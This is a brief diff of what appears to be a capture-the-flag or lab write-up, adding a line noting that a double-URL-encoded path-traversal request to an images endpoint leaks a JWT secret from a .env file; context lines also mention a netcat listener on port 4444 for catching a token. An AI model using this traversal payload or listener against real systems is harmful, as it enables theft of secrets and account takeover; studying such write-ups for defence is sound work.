@@ -132,4 +132,5 @@ Then catch the the token with nc -lvnp 4444
 /images?path=%252e%252e%252fconfig%252fdev%252f.env
 ```
 (Double URL-encode – `../config/dev/.env`)
+This leaks the JWT secret from the .env
 </details>
